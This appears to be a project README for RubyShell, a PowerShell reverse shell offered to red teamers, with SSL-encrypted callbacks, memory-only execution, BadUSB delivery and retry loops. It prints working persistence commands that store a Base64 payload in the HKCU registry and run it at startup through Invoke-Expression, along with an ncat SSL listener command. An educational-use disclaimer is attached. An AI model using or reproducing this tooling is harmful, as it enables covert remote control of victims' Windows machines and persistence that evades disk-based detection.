# RubyShell
**RubyShell** is a lightweight, SSL-encrypted reverse shell written entirely in PowerShell with full memory-only execution and stealthy persistence. Designed for red teamers, it provides reliable, no-disk communication from target to operator using `ncat` as a listener.

> **Note:** RubyShell is for **educational and authorized security testing** only.

---

## Features

- **SSL Encryption** using `SslStream`
- **No-Disk Persistence** via Windows Registry
- **Memory-Only Execution** (avoids touching disk)
- **PowerShell Based** (built-in on Windows)
- **Retry Mechanism** if initial connection fails
- **BadUSB / Rubber Ducky Compatible Payloads**

---

## How It Works

1. A short payload (e.g., from a BadUSB device) runs a one-liner that gets and executes the RubyShell script in memory from a remote host.
2. The script attempts to connect to a remote server over TCP using SSL.
3. If the connection fails, it retries every 10 seconds.
4. Once connected, the server (e.g., `ncat --ssl -lnvp 9001`) receives an interactive shell.

---

## Persistence

RubyShell does not write to disk, but stores its Base64-encoded payload in the registry:

```powershell
New-Item -Path "HKCU:\Software\RubyShell"
Set-ItemProperty -Path "HKCU:\Software\RubyShell" -Name "EncodedCode" -Value "<BASE64_ENCODED_SCRIPT>"
```
Then executes on startup via:
```powershell
powershell -c "Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path 'HKCU:\Software\RubyShell' -Name 'EncodedCode').EncodedCode)))"
```

## Listener Setup
Start your listener with:
```bash
ncat --ssl -lvnp 9001
```

## Roadmap
[x] PowerShell client with SSL
[x] Registry-based persistence
[x] Retry connection loop
[ ] RubyShell Payload Generator (CLI Tool)
[ ] DuckyScript automation
[ ] GUI version for Generator

## Legal
This tool is for **educational** and **authorized penetration testing** only. Misuse of this software can result in criminal charges. The developers take **no responsibility** for unauthorized or malicious use.
